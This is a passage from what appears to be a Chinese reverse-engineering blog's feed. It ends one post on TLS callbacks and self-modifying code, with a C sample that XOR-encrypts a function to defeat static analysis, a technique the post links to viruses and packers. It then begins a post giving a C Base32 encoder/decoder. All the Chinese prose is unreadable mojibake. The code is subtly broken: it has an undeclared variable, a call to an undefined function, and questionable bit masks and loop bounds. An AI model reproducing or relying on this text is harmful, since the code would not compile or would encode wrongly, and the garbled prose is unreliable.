çº¿ç¨‹é€€å‡º</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_DETACH   0  <span class="comment">// è¿›ç¨‹é€€å‡º</span></span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‚ç…§ä¹‹å‰å†™è¿‡çš„ä¸€ç‰‡writeupï¼š<a href="https://qianfei11.github.io/2018/05/07/2018-ZJGSCTF-writeup/#New-driver">https://qianfei11.github.io/2018/05/07/2018-ZJGSCTF-writeup/#New-driver</a></p><h1 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h1><h2 id="ä»€ä¹ˆæ˜¯SMC"><a href="#ä»€ä¹ˆæ˜¯SMC" class="headerlink" title="ä»€ä¹ˆæ˜¯SMC"></a>ä»€ä¹ˆæ˜¯SMC</h2><p>SMCï¼ˆSelf Modifying Codeï¼‰æ˜¯ä¸€ç§å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ä»£ç æˆ–æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œé˜²æ­¢åˆ«äººä½¿ç”¨é€†å‘å·¥ç¨‹å·¥å…·ï¼ˆæ¯”å¦‚ä¸€äº›å¸¸è§çš„åæ±‡ç¼–å·¥å…·ï¼‰å¯¹ç¨‹åºè¿›è¡Œé™æ€åˆ†æçš„æ–¹æ³•ï¼Œåªæœ‰ç¨‹åºè¿è¡Œæ—¶æ‰å¯¹ä»£ç å’Œæ•°æ®è¿›è¡Œè§£å¯†ï¼Œä»è€Œæ­£å¸¸è¿è¡Œç¨‹åºå’Œè®¿é—®æ•°æ®ã€‚è®¡ç®—æœºç—…æ¯’é€šå¸¸ä¹Ÿä¼šé‡‡ç”¨SMCæŠ€æœ¯åŠ¨æ€ä¿®æ”¹å†…å­˜ä¸­çš„å¯æ‰§è¡Œä»£ç æ¥è¾¾åˆ°å˜å½¢æˆ–å¯¹ä»£ç åŠ å¯†çš„ç›®çš„ï¼Œä»è€Œèº²è¿‡æ€æ¯’è½¯ä»¶çš„æŸ¥æ€æˆ–è€…è¿·æƒ‘åç—…æ¯’å·¥ä½œè€…å¯¹ä»£ç è¿›è¡Œåˆ†æã€‚ç°åœ¨ï¼Œå¾ˆå¤šåŠ å¯†è½¯ä»¶ï¼ˆæˆ–è€…ç§°ä¸ºâ€œå£³â€ç¨‹åºï¼‰ä¸ºäº†é˜²æ­¢Crackerï¼ˆç ´è§£è€…ï¼‰è·Ÿè¸ªè‡ªå·±çš„ä»£ç ï¼Œä¹Ÿé‡‡ç”¨äº†åŠ¨æ€ä»£ç ä¿®æ”¹æŠ€æœ¯å¯¹è‡ªèº«ä»£ç è¿›è¡Œä¿æŠ¤ã€‚è¦ç²¾å‡†çš„å®šä½æŸä¸ªå‡½æ•°éå¸¸éº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦ä»¥åŒºå—ä¸ºåŠ å¯†çš„åŸºç¡€å•ä½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt_func</span><span class="params">(<span class="keyword">char</span> *start_addr, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        *(start + i) ^= <span class="number">0x88</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¼–å†™SMC"><a href="#ç¼–å†™SMC" class="headerlink" title="ç¼–å†™SMC"></a>ç¼–å†™SMC</h2><p>å› ä¸ºå®šä½ä¸€ä¸ªå…·ä½“çš„å‡½æ•°å¾ˆç¹çï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©ç›´æ¥å®šä½ä¸€ä¸ªèŠ‚è¡¨ã€‚æŠŠæ•æ„Ÿçš„ä»£ç æ”¾å…¥èŠ‚è¡¨ä¸­ï¼Œç„¶ååœ¨éœ€è¦çš„æ—¶å€™è¿›è¡Œè§£å¯†ï¼Œè¿™å°±æ˜¯SMCåŠ¨æ€åŠ å¯†æŠ€æœ¯çš„ç²¾é«“ã€‚å°†ä¸‹é¢è¿™è¡Œä»£ç æ”¾åœ¨å¼€å§‹ç¨‹åºçš„å¼€å§‹ï¼ˆä¹Ÿå°±æ˜¯includeä¸‹é¢ï¼‰ï¼Œä¸»è¦æ˜¯è®©textèŠ‚åŒºå¯ä»¥æ‰§è¡Œã€è¯»ã€å†™å’Œåˆ†äº«ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/SECTION:.text,ERWS"</span>)</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹ä»£ç å¯ä»¥ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½†æ˜¯æ— æ³•è¿è¡Œï¼Œå› ä¸º<code>ck()</code>å‡½æ•°çš„åœ°å€å·²ç»è¢«æ‰“ä¹±ã€‚è¿™æ—¶å€™å°±åˆ©ç”¨ODè¿›è¡Œä¿®æ”¹ï¼Œè½½å…¥ç”Ÿæˆçš„ç¨‹åºï¼Œå½“ç¨‹åºè¿è¡Œ<code>enccrpt_func()</code>å‡½æ•°å®Œæˆæ—¶ï¼Œ<code>ck()</code>å°±å·²ç»å®ŒæˆåŠ å¯†ï¼Œç„¶åå°†ç¨‹åºdumpä¸‹æ¥ï¼Œè¿™æ—¶å°±å¯ä»¥è¿è¡Œã€‚è‹¥æ‹¿ä¸€å¼€å§‹çš„ç¨‹åºå»é™æ€çœ‹ï¼Œæ˜¯å®Œå…¨çœ‹ä¸æ‡‚çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/SECTION:.text,ERWS"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt_func</span><span class="params">(<span class="keyword">char</span> *start_addr, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123; <span class="comment">//è¿™é‡Œå¯¹åœ°å€è¿›è¡Œç®€å•çš„åŠ å¯†&gt;</span></span><br><span class="line">*(start + i) ^= <span class="number">0x88</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//éœ€è¦ä¿æŠ¤çš„å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ck</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is a test of smc"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åŠ å¯†æ•°æ®ç»“æŸçš„åœ°å€</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">end</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *lp_s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *lp_e = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">lp_s = (<span class="keyword">char</span> *)ck;  <span class="comment">//è·å–éœ€è¦åŠ å¯†å‡½æ•°çš„èµ·å§‹åœ°å€</span></span><br><span class="line">lp_e = (<span class="keyword">char</span> *)end;  <span class="comment">//è·å–éœ€è¦åŠ å¯†å‡½æ•°çš„ç»“æŸåœ°å€</span></span><br><span class="line">len = lp_e - lp_s;</span><br><span class="line">enc(lp_s, len);      <span class="comment">//smcåŠ å¯†å‡½æ•°</span></span><br><span class="line">ck();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£å¯†SMC"><a href="#è§£å¯†SMC" class="headerlink" title="è§£å¯†SMC"></a>è§£å¯†SMC</h2><ol><li>æ‰¾åˆ°smcçš„åŠ å¯†å‡½æ•°ï¼Œå½“è¿è¡Œå®Œæˆsmcè§£å¯†å‡½æ•°æ—¶,å°†ç¨‹åºdumpä¸‹æ¥ã€‚</li><li>smcå¯¹ç¨‹åºåŠ¨æ€å®Œå…¨æ²¡æœ‰ç”¨ï¼Œå¯ä»¥ç”¨ODæ¥è°ƒè¯•ç¨‹åºï¼Œæ‰¾åˆ°å—ä¿æŠ¤ä»£ç ã€‚</li></ol><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="http://www.hexblog.com/?p=9" target="_blank" rel="noopener">http://www.hexblog.com/?p=9</a><br><a href="http://www.voidcn.com/article/p-etaovjqz-bao.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-etaovjqz-bao.html</a><br><a href="http://www.uml.org.cn/c++/200710313.asp" target="_blank" rel="noopener">http://www.uml.org.cn/c++/200710313.asp</a><br><a href="https://esebanana.github.io/2018/04/08/re_10_tls_smc/" target="_blank" rel="noopener">https://esebanana.github.io/2018/04/08/re_10_tls_smc/</a><br><a href="http://www.voidcn.com/article/p-etaovjqz-bao.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-etaovjqz-bao.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mainå‡½æ•°å‰æœ‰ä»€ä¹ˆï¼Ÿ&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Cè¯­è¨€å®ç°Base32å’ŒBase16è§£å¯†åŠ å¯†ç®—æ³•</title>
    <link href="https://qianfei11.github.io/2018/12/04/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0Base32%E5%92%8CBase16%E8%A7%A3%E5%AF%86%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://qianfei11.github.io/2018/12/04/Cè¯­è¨€å®ç°Base32å’ŒBase16è§£å¯†åŠ å¯†ç®—æ³•/</id>
    <published>2018-12-04T14:04:09.000Z</published>
    <updated>2018-12-05T08:15:28.195Z</updated>
    
    <content type="html"><![CDATA[<p>æ‰¿æ¥ä¹‹å‰<a href="https://qianfei11.github.io/2018/05/12/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0base64%E8%A7%A3%E5%AF%86%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">Base64çš„æ–‡ç« </a>ï¼Œå®ç°äº†ä¸€ä¸‹Base32å’ŒBase16ï¼ŒåŸç†æ˜¯ä¸€æ ·çš„ã€‚</p><a id="more"></a><h1 id="Base32åŠ è§£å¯†å®ç°"><a href="#Base32åŠ è§£å¯†å®ç°" class="headerlink" title="Base32åŠ è§£å¯†å®ç°"></a>Base32åŠ è§£å¯†å®ç°</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *base32payload = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567="</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_pos</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(c == base32payload[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base32_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> sign = len % <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> res_len = len % <span class="number">5</span> ? ((len) / <span class="number">5</span> + <span class="number">1</span>) * <span class="number">8</span> : (len) / <span class="number">5</span> * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len; i += <span class="number">5</span>, j += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i + <span class="number">4</span> &gt;= len) &#123;</span><br><span class="line">            res[j] = (s[i] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">            <span class="keyword">if</span>(sign == <span class="number">1</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = (s[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x1C</span>;</span><br><span class="line">                res[j + <span class="number">2</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">4</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x20</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sign == <span class="number">2</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = ((s[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x1C</span>) | ((s[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x18</span>);</span><br><span class="line">                res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = (s[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">4</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x20</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sign == <span class="number">3</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = ((s[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x1C</span>) | ((s[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x18</span>);</span><br><span class="line">                res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = ((s[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x10</span>) | ((s[i + <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>);</span><br><span class="line">                res[j + <span class="number">4</span>] = (s[i + <span class="number">2</span>] &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x1E</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x20</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sign == <span class="number">4</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = ((s[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x1C</span>) | ((s[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x18</span>);</span><br><span class="line">                res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = ((s[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x10</span>) | ((s[i + <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>);</span><br><span class="line">                res[j + <span class="number">4</span>] = ((s[i + <span class="number">2</span>] &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x1E</span>) | ((s[i + <span class="number">3</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x10</span>);</span><br><span class="line">                res[j + <span class="number">5</span>] = (s[i + <span class="number">3</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = (s[i + <span class="number">3</span>] &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0x18</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x20</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res[j] = (s[i] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">        res[j + <span class="number">1</span>] = ((s[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x1C</span>) | ((s[i + <span class="number">1</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x03</span>);</span><br><span class="line">        res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">        res[j + <span class="number">3</span>] = ((s[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x10</span>) | ((s[i + <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>);</span><br><span class="line">        res[j + <span class="number">4</span>] = ((s[i + <span class="number">2</span>] &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x1E</span>) | ((s[i + <span class="number">3</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x10</span>);</span><br><span class="line">        res[j + <span class="number">5</span>] = (s[i + <span class="number">3</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">        res[j + <span class="number">6</span>] = ((s[i + <span class="number">3</span>] &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0x18</span>) | ((s[i + <span class="number">4</span>] &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x07</span>);</span><br><span class="line">        res[j + <span class="number">7</span>] = s[i + <span class="number">4</span>] &amp; <span class="number">0x1F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; res_len; j++) &#123;</span><br><span class="line">        res[j] = base32payload[res[j]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base32_decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> res_len = len / <span class="number">8</span> * <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> count = len / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> s_index = i * <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">int</span> res_index = i * <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">int</span> buffer[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">int</span> sign = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            buffer[j] = find_pos(s[s_index + j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i == count - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(buffer[j] == <span class="number">0x20</span>) &#123;</span><br><span class="line">                    sign++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index] = ((buffer[<span class="number">0</span>] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">3</span>) | ((buffer[<span class="number">1</span>] &amp; <span class="number">0x1C</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">1</span>] = ((buffer[<span class="number">1</span>] &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">6</span>) | ((buffer[<span class="number">2</span>] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">1</span>) | ((buffer[<span class="number">3</span>] &amp; <span class="number">0x10</span>) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">2</span>] = ((buffer[<span class="number">3</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((buffer[<span class="number">4</span>] &amp; <span class="number">0x1E</span>) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">3</span>] = ((buffer[<span class="number">4</span>] &amp; <span class="number">0x01</span>) &lt;&lt; <span class="number">7</span>) | ((buffer[<span class="number">5</span>] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">2</span>) | ((buffer[<span class="number">6</span>] &amp; <span class="number">0x18</span>) &gt;&gt; <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">4</span>] = ((buffer[<span class="number">6</span>] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>) | (buffer[<span class="number">7</span>] &amp; <span class="number">0x1F</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s1[MAX];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s1);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *s2 = base32_encode((<span class="keyword">const</span> <span class="keyword">char</span> *)s1, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s2);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *s3 = base32_decode((<span class="keyword">const</span> <span class="keyword">char</span> *)s2, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s3);</span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="built_in">free</span>(s3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 